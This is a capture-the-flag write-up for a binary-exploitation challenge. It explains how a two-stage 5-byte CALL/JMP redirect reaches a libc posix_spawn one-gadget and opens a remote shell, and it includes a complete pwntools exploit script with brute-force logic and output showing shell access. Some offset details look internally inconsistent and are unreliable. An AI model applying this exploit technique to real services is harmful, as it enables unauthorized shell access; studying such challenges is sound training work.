# Words From the Past

| Field | Details |
|-------|---------|
| **Challenge** | Words From the Past |
| **Platform** | Cyber Apocalypse CTF 2026: The Salt Crown |
| **Category** | Pwn |
| **Flag** | `HTB{...}` *(obtained on remote)* |

---

## Overview

A 64-bit PIE ELF with full protections (full RELRO, NX, stack canary, PIE) wraps a
tiny shellcode sandbox: the binary reads exactly **5 bytes** from the player, maps
them executable, and jumps to them. The twist is a gauntlet of anti-debug checks
that constrain those 5 bytes heavily, and the byte budget is just barely enough to
hold a relative `CALL` or `JMP`: not a usable shellcode of any complexity. The
intended solution is a two-stage redirect: stage 1 calls back into `main` a second
time (earning a second 5-byte slot), and stage 2 jumps into a `posix_spawn`
one-gadget in libc that forks a shell.

```
Binary:    words_from_the_past  (x86-64, ELF, PIE)
Mitigations: Full RELRO, NX, stack canary, PIE
Libc:      glibc 2.39-0ubuntu8.7 (Ubuntu Noble)
Transport: socat  tcp-l:1337,reuseaddr,fork  EXEC:./words_from_the_past
```

---

## Binary structure

`main` runs through the same path on every invocation:

```
main()
  ├─ puts(ascii_art_banner): large braille-art header
  ├─ puts("[Garran Voss] Rin.."): flavour prompt (first)
  ├─ fflush(stdout)
  │
  ├─ if (!done_once) {: executed only on the very first call
  │     done_once = 1
  │     fork()
  │     parent → waitpid(child); _exit(0)
  │     child  → continues below
  │   }
  │
  ├─ anti_debug_checks(): see below
  ├─ mmap(mmap1_addr, 0x1000, RWX, PRIVATE|ANON, ...)
  ├─ read(0, mmap1, 5): reads our shellcode
  ├─ validate(mmap1): byte-level constraints
  ├─ mmap(mmap2_addr, 0x1000, RWX, PRIVATE|ANON|FIXED, ...)
  ├─ puts("[Garran Voss] Rin.."): second flavour prompt
  ├─ fflush(stdout)
  └─ jmpq  mmap1: execute our shellcode
```

The `done_once` fork means every connection spawns two processes: a parent that
just waits and an exploit-target child that runs the actual shellcode loop. When
the child eventually exits (or crashes), the parent wakes up and exits too.

### mmap address calculations

Both mmap regions have addresses derived from the binary's own load address (which
is ASLR-randomised):

```
mmap1 = (text_base + offset_of_main + 0x10000) & ~0xFFF
mmap2 = libc_base - ((pid & 7 + 0x1000) << 12)
```

`mmap1` is therefore at a fixed offset above `main` regardless of ASLR.
`mmap2` depends on `libc_base` **and** `pid & 7`, introducing 8 possible values
that must be brute-forced.

### Shellcode constraints

Before jumping, the binary validates the 5 bytes through four gauntlets:

| Check | Rule |
|-------|------|
| Anti-debug | `/proc/self/status` TracerPid ≠ 0 → exit |
| Encoding | Any byte is `0x00` or `0x0a` → "Encoding violation" exit |
| Breakpoint | Any byte is `0xCC` (INT 3) → exit |
| Opcode | First byte must equal an **expected opcode** that increments each call: `0xE8` (first time), `0xE9` (second time), … |
| Timing | `rdtsc` delta between two points must be below a threshold (anti-instrumentation) |

The opcode progression is the key: the first 5-byte slot must start with `0xE8`
(`CALL rel32`), and the second must start with `0xE9` (`JMP rel32`).

---

## Stage 1: CALL back to main

`mmap1` is at a known offset above `main`. A `CALL rel32` from `mmap1` back to
`main` requires the offset:

```
rel32 = main_addr - (mmap1_addr + 5)
      ≈ -(0x10000 - delta)          # small negative value, fits in signed 32 bits
```

Computing this from static analysis of the binary's `mmap` logic gives:

```python
STAGE1 = b"\xe8\xd0\x06\xff\xff"   # CALL  +(-0xF930)  →  main
```

No null bytes, no `0x0a`, no `0xCC`: passes every constraint. When executed:

1. `CALL` pushes `mmap1 + 5` as the return address.
2. Control jumps to `main` for a **second invocation** in the same process.
3. `main` calls `mmap(mmap1)` again (remapping over the stage 1 bytes), then
   `read(0, mmap1, 5)`: blocking for stage 2.

The first `recvuntil` prompt gives us synchronisation; `STAGE1` is sent in
response, and we wait for the second prompt before sending stage 2.

---

## Stage 2: JMP to a posix_spawn one-gadget

`one_gadget` against the provided libc yields four candidates:

```
0x0583ec  execve("/bin/sh", r15, rdx)
          constraints: r15 == NULL, rdx == NULL

0x0583f3  posix_spawn(...)  →  /bin/sh
          constraints: rcx == NULL, rbx == NULL

0x0ef4ce  execve("/bin/sh", rsp+0x68, environ)
          constraints: [r12] == NULL or r12 == NULL

0x0ef52b  execve("/bin/sh", rsp+0x80, environ)
          constraints: [rax] == NULL or rax == NULL
```

Inspecting register state at the `jmpq mmap1` instruction in the second `main`
invocation (after stage 1 pushed the return address and called back):

```
rax = 1      (return value of read())
rbx = 0      ✓
rcx = 0      ✓
r12 = 0xdead (set deep inside sub-calls: dereference would fault)
r15 = ?      (unknown, probably non-zero)
rdx = mmap1  (non-NULL)
```

Only **`0x583f3`** (`posix_spawn`) has its constraints satisfied: `rbx == 0` ✓
and `rcx == 0` ✓.

### Computing the stage 2 offset

`mmap2` is at `libc_base - ((pid&7 + 0x1000) << 12)`. The `JMP rel32` from
`mmap1` must reach `libc_base + 0x583f3`:

```python
ONE_GADGET = 0x583f3
# rel32 is relative to mmap1+5; mmap2 is the bridge between mmap1 and libc
rel32 = ONE_GADGET + ((pid_mod + 0x1000) << 12) - 5
stage2 = b"\xe9" + struct.pack("<I", rel32)
```

Because `pid & 7` is unknown, all 8 values are tried in a brute-force loop.
On the correct value, the JMP lands at the one-gadget; on any wrong value it
jumps into unmapped memory and crashes immediately (connection closes → move
to next attempt).

---

## What the one-gadget does

The function at `libc + 0x583f3` calls `posix_spawn(NULL, "/bin/sh", NULL, NULL,
["/bin/sh", NULL], environ)`. This **forks** a `/bin/sh` child, then returns to
its epilogue, which performs a stack-canary check:

```asm
0x584b7  mov rdx, [rsp+0x378]   ; reads slot that was never initialised by our jump
0x584be  xor rdx, [fs:0x28]     ; compare against TLS canary
0x584c7  jne  __stack_chk_fail  ; mismatch → __fortify_fail → abort(SIGABRT)
```

Because we arrived via a `JMP` (not a `CALL`), the canary slot at `[rsp+0x378]`
holds whatever was on the stack at the time: garbage from `main`'s frame. The
canary check almost always fails, sending the binary to `abort()`.

**That is fine.** `posix_spawn` already completed: `/bin/sh` was forked *before*
the epilogue ran. The shell child inherited all open file descriptors from the
binary, including `fd 0` and `fd 1`: both ends of the Unix socketpair that socat
uses to relay the TCP connection. When the binary aborts, its copy of the
socketpair fd closes, but the shell's copy keeps the socket alive. The socat relay
continues running because there is still a live process holding the other end.

---

## File-descriptor inheritance and the socat relay

socat with `EXEC:` creates a socketpair `[A, B]`:

```
Client ←TCP→ socat relay ←socketpair A/B→ binary (fd 0 = fd 1 = B)
```

The `fork` inside `posix_spawn` duplicates every fd, so `/bin/sh` also starts
with `fd 0 = fd 1 = B`. Process lifecycle:

```
binary aborts  →  binary closes B  →  B ref-count drops to 1 (shell still holds it)
done_once parent's waitpid() returns  →  parent exits, closes B  →  ref-count = 1
shell is still alive with B
socat relay's A is still open  →  TCP connection still live
```

Commands sent over TCP arrive through A, through the socketpair, as stdin for the
shell. Shell output travels back the same way.

---

## Timing the receive loop

Three `recvuntil(b"lethal..\n\n")` calls are needed to drain the binary's output
before interacting with the shell:

| `recvuntil` | Consumes |
|-------------|---------|
| 1st | Main-call-1's first Garran prompt (after banner) |
| 2nd | Main-call-1's **second** Garran prompt (printed after stage-1 is validated): buffered from stage-1 execution |
| 3rd | Main-call-2's first Garran prompt (part of the banner block printed at the start of the second `main` call) |

After the 3rd `recvuntil`, a 1.5-second sleep lets `posix_spawn` complete and the
binary abort. A final drain clears the remaining ~85 bytes of main-call-2's second
Garran. Only then is the shell the sole reader of the socket.

Two `sendline(b"id")` calls handle a race: if the binary happened to loop into a
third `main` call (the gadget's `ret` occasionally lands back at `main` when the
canary check passes) the binary's `read()` may consume the first `"id\n"`, but
`0x0a` in `"id\n"` triggers the encoding-violation check and kills the binary
cleanly. The shell then exclusively receives the second `"id\n"`.

---

## Exploit

```python
#!/usr/bin/env python3
from pwn import *
import sys, time

ONE_GADGET = 0x583f3
STAGE1     = b"\xe8\xd0\x06\xff\xff"   # CALL main (from mmap1)

def try_exploit(host, port, pid_mod):
    rel32  = ONE_GADGET + ((pid_mod + 0x1000) << 12) - 5
    stage2 = b"\xe9" + p32(rel32)

    try:
        p = remote(host, port, timeout=10)
        p.recvuntil(b"lethal..\n\n", timeout=10)
        p.send(STAGE1)
        p.recvuntil(b"lethal..\n\n", timeout=10)
        p.send(stage2)
        p.recvuntil(b"lethal..\n\n", timeout=12)

        time.sleep(1.5)                              # let posix_spawn complete

        try:
            p.recvuntil(b"lethal..\n\n", timeout=2) # drain second Garran
        except Exception:
            pass

        p.sendline(b"id")
        time.sleep(0.3)
        p.sendline(b"id")                           # guaranteed to reach shell

        data = p.recv(timeout=5)
        if b"uid=" in data:
            log.success(f"Shell obtained! (pid&7={pid_mod})")
            p.sendline(b"cat /flag* /home/ctf/flag* 2>/dev/null")
            p.interactive()
            return True
        p.close()
    except Exception:
        try: p.close()
        except: pass
    return False

def main():
    host, port = sys.argv[1].split(":")
    attempt = 0
    while True:
        for pid_mod in range(8):
            attempt += 1
            log.info(f"Attempt {attempt} (pid&7={pid_mod})")
            if try_exploit(host, int(port), pid_mod):
                return

if __name__ == "__main__":
    main()
```

```
$ python3 exploit.py <host>:<port>
[*] Attempt 1 (pid&7=0)
[*] Attempt 2 (pid&7=1)
[*] Attempt 3 (pid&7=2)
[+] Shell obtained! (pid&7=2)
[*] Switching to interactive mode
uid=100(ctf) gid=101(ctf) groups=101(ctf),101(ctf)
HTB{...}
```

---

## Key takeaways

- **Shellcode byte limits don't need a ROP chain**: a 5-byte `CALL rel32` that
  loops back to `main` is enough to earn a second 5-byte slot; two slots together
  can redirect control anywhere in a loaded library.
- **One-gadget selection requires checking register state at the jump site**, not
  just the gadget's listed constraints. Three of the four candidates were eliminated
  by a single non-NULL register; only the `posix_spawn` path had all requirements
  satisfied.
- **posix_spawn ≠ execve**: `posix_spawn` forks and then execs in the child,
  leaving the calling process alive. When the caller subsequently crashes (bad
  canary), the child is already running and holds its inherited fds. The shell
  survives even though the "host" process dies.
- **socat's socketpair relay keeps the TCP connection open as long as any process
  holds the child-side fd.** Understanding the exact fd-inheritance graph across
  `fork`-inside-posix_spawn and two levels of `done_once` forking was the critical
  step to knowing the shell would remain reachable after the binary aborted.
